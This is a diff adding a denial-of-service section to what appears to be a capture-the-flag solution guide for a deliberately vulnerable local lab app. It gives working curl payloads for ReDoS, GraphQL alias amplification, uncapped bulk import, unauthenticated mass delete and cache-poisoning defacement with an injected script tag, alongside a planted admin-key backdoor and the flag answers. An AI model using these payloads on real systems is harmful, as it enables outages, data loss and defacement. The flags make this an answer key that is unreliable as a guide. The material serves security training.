@@ -438,3 +438,38 @@ A planted static key grants admin on any request (get the key from #5):
 ```bash
 curl -s localhost:4060/api/staff/tools -H "x-support-override: lj_admin_7f3c9a1e2b6d4058"   # FLAG{lj_support_override_backdoor}
 ```
+
+---
+
+# v6 — Burn1t (chaos / DoS — safe & resettable)
+
+### 51. ReDoS · `POST /api/promo/validate`
+`^([A-Za-z0-9]+)+$` backtracks catastrophically (input bounded to 24 chars to keep the range usable):
+```bash
+curl -s localhost:4060/api/promo/validate -H 'content-type: application/json' -d '{"code":"aaaaaaaaaaaaaaaaaaaaaaa!"}'   # elapsed_ms spikes → FLAG{lj_redos_promo}
+```
+
+### 52. GraphQL alias amplification · `POST /graphql`
+Hundreds of aliased fields in one doc (no cost cap):
+```bash
+curl -s localhost:4060/graphql -H 'content-type: application/json' -d '{"query":"{ a0:products{name} a1:products{name} ... a899:products{name} }"}'   # FLAG{lj_graphql_alias_amplification}
+```
+
+### 53. Uncapped bulk import · `POST /api/import/bulk`
+No size limit on `items`:
+```bash
+curl -s localhost:4060/api/import/bulk -H 'content-type: application/json' -d '{"items":[ ...2000 objects... ]}'   # FLAG{lj_uncapped_bulk_import}
+```
+
+### 54. Unauthenticated mass delete · `POST /api/admin/wipe`
+No auth, no confirmation — wipes all reviews (blast radius; `/__reset` restores):
+```bash
+curl -s -X POST localhost:4060/api/admin/wipe   # FLAG{lj_unauth_mass_delete}
+```
+
+### 55. Cache poisoning (deface) · `GET /promo-banner.css`
+An unkeyed `X-Forwarded-Host` is reflected into a cacheable response — poison it once, everyone sees it:
+```bash
+curl -s localhost:4060/promo-banner.css -H 'x-forwarded-host: evil.example/"><script>x</script>'  # primes cache
+curl -s localhost:4060/promo-banner.css   # served from cache → FLAG{lj_cache_poison_deface}
+```
